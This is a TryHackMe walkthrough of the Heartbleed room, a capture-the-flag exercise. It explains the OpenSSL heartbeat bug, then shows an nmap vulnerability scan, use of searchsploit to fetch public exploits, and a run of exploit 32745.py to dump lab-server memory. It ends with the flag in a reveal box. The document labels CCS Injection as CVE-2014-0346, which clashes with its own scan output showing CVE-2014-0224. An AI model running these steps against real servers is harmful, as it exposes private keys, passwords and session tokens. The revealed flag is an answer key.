# HeartBleed — TryHackMe Walkthrough

> SSL issues are still lurking in the wild. Can you exploit this web server's OpenSSL?

<p align="center">
  <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/82db1237966d14e10bf2c66690989283.png" />
</p>

<p align="center">
  <a href="https://tryhackme.com/room/heartbleed">
    <img src="https://img.shields.io/badge/TryHackMe-HeartBleed-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Easy-green">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-CVE--2014--0160%20%7C%20OpenSSL%20%7C%20Memory%20Disclosure-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Heartbleed Vulnerability Theory |
| 2 | CVE-2014-0160 — OpenSSL 1.0.1 to 1.0.1f Memory Disclosure |
| 3 | CVE-2014-0346 — OpenSSL CCS Injection |
| 4 | Nmap Vulnerability Scanning (`--script vuln`) |
| 5 | Exploit Discovery via SearchSploit |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Explain how the Heartbleed vulnerability works at a conceptual level
- Use Nmap with the `--script vuln` flag to detect known SSL/TLS vulnerabilities
- Use SearchSploit to locate public exploit code from Exploit-DB
- Run a Heartbleed memory disclosure exploit to extract sensitive data from server memory

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap and SearchSploit (exploitdb) installed
- Python 2 available for running the exploit scripts
- Target machine running on TryHackMe (replace `Machine_IP` with your assigned IP)

---

## Task 1 — Background: How Heartbleed Works

Heartbleed is a critical vulnerability in the **OpenSSL** cryptographic library affecting versions **1.0.1 through 1.0.1f**. It was disclosed publicly in April 2014 and is catalogued as **CVE-2014-0160**.

### The Heartbeat Mechanism

TLS connections use a **heartbeat** message to keep a session alive during idle periods — restarting a full TLS handshake every time a connection goes quiet would be expensive and slow. A heartbeat works as follows:

1. The client sends a message containing some random data and the **claimed length** of that data
2. The server echoes the exact same data back to confirm the connection is still alive

### The Bug

The vulnerability is that the server **never verifies** whether the claimed length actually matches the amount of data sent. The attack flow is:

1. An attacker sends a heartbeat message with **zero bytes of real data** but claims a length of up to **65,535 bytes**
2. The server allocates a buffer of that size and copies `payload` bytes from memory into it — but since no real data was sent, it reads **arbitrary memory** adjacent to where the message was stored
3. The server sends this raw memory back to the attacker

This allows an attacker to read up to 64KB of server memory per request — and by repeating the attack many times, large amounts of memory can be harvested. This memory may contain:

- Private TLS certificate keys
- Plaintext usernames and passwords
- Session tokens and cookies
- Any other sensitive data recently processed by the server

### Remediation

The fix requires two checks before copying memory:

- The server must reject heartbeat messages where the claimed length is zero
- The server must verify the claimed length does not exceed the actual length of data received

### References

- [heartbleed.com](http://heartbleed.com/)
- [Diagnosis of the OpenSSL Heartbleed Bug](https://www.seancassidy.me/diagnosis-of-the-openssl-heartbleed-bug.html)
- [Heartbleed Bug Explained — StackAbuse](https://stackabuse.com/heartbleed-bug-explained/)
- [TLS 1.2 Illustrated](https://tls.ulfheim.net/)
- [TLS 1.3 Illustrated](https://tls13.ulfheim.net/)

---

## Task 2 — Protecting Data In Transit

> Note: It may take between 3–4 minutes for the server to fully deploy and configure. Please be patient before starting.

---

### Step 1 — Vulnerability Scanning with Nmap

**Approach:** Run Nmap with the `--script vuln` flag in addition to service and version detection. This loads Nmap's vulnerability detection scripts and automatically checks for a range of known CVEs including Heartbleed.

```
kali@kali:~/CTFs/tryhackme/HeartBleed$ sudo nmap -sS -sC -sV -O --script vuln Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 19:23 CEST
Nmap scan report for Machine_IP
Host is up (0.043s latency).
Not shown: 994 closed ports
PORT    STATE    SERVICE      VERSION
22/tcp  open     ssh          OpenSSH 7.4 (protocol 2.0)
| vulners:
|   cpe:/a:openbsd:openssh:7.4:
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473
|_      CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
111/tcp open     rpcbind      2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
135/tcp filtered msrpc
139/tcp filtered netbios-ssn
443/tcp open     ssl/http     nginx 1.15.7
|_http-server-header: nginx/1.15.7
| ssl-ccs-injection:
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|
|     References:
|       http://www.cvedetails.com/cve/2014-0224
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|_      http://www.openssl.org/news/secadv_20140605.txt
| ssl-heartbleed:
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://cvedetails.com/cve/2014-0160/
|_      http://www.openssl.org/news/secadv_20140407.txt
445/tcp filtered microsoft-ds

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 298.02 seconds
```

> **Note:** The Nmap `ssl-heartbleed` script confirms the target is **VULNERABLE** to CVE-2014-0160 on port 443. The scan also identifies a second OpenSSL vulnerability — **CCS Injection (CVE-2014-0224)** — which allows a man-in-the-middle attacker to force a zero-length master key and hijack encrypted sessions. Both vulnerabilities exist because the server is running a critically outdated version of OpenSSL. Port 443 running nginx over HTTPS is our exploitation target.

---

### Step 2 — Finding Exploit Code with SearchSploit

**Approach:** Use SearchSploit to search the local Exploit-DB mirror for public Heartbleed proof-of-concept exploits and copy the relevant scripts into the working directory.

```
kali@kali:~/CTFs/tryhackme/HeartBleed$ searchsploit heartbleed
------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                         |  Path
------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)    | multiple/remote/32764.py
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                                    | multiple/remote/32791.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)                     | multiple/remote/32998.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                                       | multiple/remote/32745.py
------------------------------------------------------------------------------------------------------- ---------------------------------
kali@kali:~/CTFs/tryhackme/HeartBleed$ searchsploit -m 32764 32791 32998 32745
  Exploit: OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)
      URL: https://www.exploit-db.com/exploits/32764
     Path: /usr/share/exploitdb/exploits/multiple/remote/32764.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/kali/CTFs/tryhackme/HeartBleed/32764.py

  Exploit: OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)
      URL: https://www.exploit-db.com/exploits/32791
     Path: /usr/share/exploitdb/exploits/multiple/remote/32791.c
File Type: C source, ASCII text, with CRLF line terminators

Copied to: /home/kali/CTFs/tryhackme/HeartBleed/32791.c

  Exploit: OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)
      URL: https://www.exploit-db.com/exploits/32998
     Path: /usr/share/exploitdb/exploits/multiple/remote/32998.c
File Type: ASCII text, with CRLF line terminators

Copied to: /home/kali/CTFs/tryhackme/HeartBleed/32998.c

  Exploit: OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure
      URL: https://www.exploit-db.com/exploits/32745
     Path: /usr/share/exploitdb/exploits/multiple/remote/32745.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/kali/CTFs/tryhackme/HeartBleed/32745.py
```

> **Note:** SearchSploit finds four exploits for Heartbleed — two Python scripts and two C programs. The `-m` flag copies them into the current directory. We will use **32745.py** — a Python script that repeatedly sends malformed heartbeat requests and dumps the raw memory returned. Since the server memory changes with each request, the exploit may need to be run multiple times before the flag appears in the output. Redirect the output to a file with `>` and search through it for the flag format.

---

### Step 3 — Running the Exploit and Extracting the Flag

**Approach:** Run the `32745.py` exploit against the target on port 443 and save the output to a file. Search the output for the flag.

```
kali@kali:~/CTFs/tryhackme/HeartBleed$ python 32745.py Machine_IP > 32745result.txt
```

> **Note:** The script sends repeated malformed heartbeat packets to the server and dumps whatever memory is returned. Because the server's memory contents change constantly, the flag may not appear on the first run — run the script multiple times if needed, or increase the number of requests the script sends. Once the output file is captured, search it with `grep` or `strings` for the `THM{` flag format:
> ```
> grep -a "THM{" 32745result.txt
> ```
> The flag will appear embedded within the raw memory dump as readable ASCII text.

---

### Question 1 — What is the flag?

<details>
<summary>Reveal Answer</summary>

**`THM{sSl-Is-BaD}`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap with `--script vuln` on port 443 | Confirmed CVE-2014-0160 (Heartbleed) and CVE-2014-0224 (CCS Injection) |
| 2 | SearchSploit for `heartbleed` | Located four public exploit scripts on Exploit-DB |
| 3 | Copied exploit 32745.py with `searchsploit -m` | Staged the Python memory disclosure script |
| 4 | Ran `32745.py` against target, redirected output | Harvested raw server memory containing the flag |
| 5 | Searched output for `THM{` | Extracted the flag from dumped memory |

---

## Key Takeaways

| Concept | Detail |
|---------|--------|
| Affected versions | OpenSSL 1.0.1 through 1.0.1f |
| CVE identifiers | CVE-2014-0160 (Heartbleed), CVE-2014-0346 (related) |
| Attack type | Memory disclosure — reads up to 64KB of server RAM per request |
| Data at risk | Private keys, passwords, session tokens, any recently processed plaintext |
| Detection | Nmap `ssl-heartbleed` script, Nessus, OpenVAS |
| Fix | Upgrade OpenSSL to 1.0.1g or later, reissue and revoke all SSL certificates |
